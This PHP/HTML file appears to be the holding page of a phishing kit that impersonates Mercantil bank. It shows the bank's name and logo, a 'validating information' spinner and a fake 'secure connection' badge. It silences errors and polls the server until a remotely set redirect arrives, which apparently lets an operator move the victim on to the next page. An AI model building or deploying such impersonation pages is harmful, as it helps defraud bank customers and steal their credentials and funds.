<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

session_write_close();
session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
            echo json_encode(['redirect' => $_SESSION['redirect']]);
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        } else {
            echo json_encode(['redirect' => null]);
        }
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
<title>Mercantil</title>

<!-- Fuente moderna -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: 'Inter', sans-serif;
    background: linear-gradient(135deg, #001f3f, #004e9b);
}

/* CARD CENTRAL */
.overlay {
    background: rgba(255, 255, 255, 0.08);
    backdrop-filter: blur(12px);
    border-radius: 20px;
    padding: 40px 50px;
    display: flex;
    flex-direction: column;
    align-items: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.25);
    border: 1px solid rgba(255,255,255,0.15);
    animation: fadeIn 0.6s ease;
}

/* SPINNER */
.multi-spinner-container {
    width: 130px;
    height: 130px;
    position: relative;
}

.multi-spinner {
    position: absolute;
    width: 100%;
    height: 100%;
    border-radius: 50%;
    border: 4px solid transparent;
}

.multi-spinner.blue {
    border-top-color: #4da3ff;
    animation: spin 1.6s linear infinite;
    filter: drop-shadow(0 0 8px rgba(77,163,255,0.5));
}

.multi-spinner.orange {
    top: 10px;
    left: 10px;
    width: calc(100% - 20px);
    height: calc(100% - 20px);
    border-top-color: #f58220;
    animation: spinReverse 2s linear infinite;
}

/* LOGO */
.logo-center {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(1);
    width: 70px;
    height: 70px;
    border-radius: 50%;
    overflow: hidden;
    animation: pulse 2s ease-in-out infinite;
}

.logo-center img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* TEXTO */
.loading-text {
    margin-top: 25px;
    font-size: 17px;
    color: #ffffff;
    font-weight: 500;
    letter-spacing: 0.3px;
}

/* DOTS */
.loading-dots::after {
    content: "";
    animation: dots 1.5s infinite steps(4, end);
}

/* SECURITY BADGE */
.secure {
    margin-top: 18px;
    font-size: 13px;
    color: rgba(255,255,255,0.7);
    display: flex;
    align-items: center;
    gap: 6px;
}

/* ICONO LOCK */
.lock {
    width: 14px;
    height: 14px;
    border: 2px solid #4da3ff;
    border-radius: 3px;
    position: relative;
}

.lock::before {
    content: "";
    position: absolute;
    top: -7px;
    left: 50%;
    transform: translateX(-50%);
    width: 10px;
    height: 6px;
    border: 2px solid #4da3ff;
    border-bottom: none;
    border-radius: 10px 10px 0 0;
}

/* ANIMACIONES */
@keyframes spin {
    100% { transform: rotate(360deg); }
}

@keyframes spinReverse {
    100% { transform: rotate(-360deg); }
}

@keyframes dots {
    0% { content: ""; }
    25% { content: "."; }
    50% { content: ".."; }
    75% { content: "..."; }
}

@keyframes pulse {
    0%, 100% { transform: translate(-50%, -50%) scale(1); }
    50% { transform: translate(-50%, -50%) scale(1.08); }
}

@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(10px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}
</style>
</head>

<body>

<div class="overlay">
    <div class="multi-spinner-container">
        <div class="multi-spinner blue"></div>
        <div class="multi-spinner orange"></div>
        <div class="logo-center">
            <img src="logo-loader.png" alt="Mercantil">
        </div>
    </div>

    <div class="loading-text">
        Validando información<span class="loading-dots"></span>
    </div>

    <div class="secure">
        <div class="lock"></div>
        Conexión segura
    </div>
</div>

<script>
function checkRedirect() {
    fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, 'UTF-8'); ?>&check=1')
        .then(response => response.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            } else {
                setTimeout(checkRedirect, 1500);
            }
        })
        .catch(() => setTimeout(checkRedirect, 1500));
}
window.onload = checkRedirect;
</script>

</body>
</html>
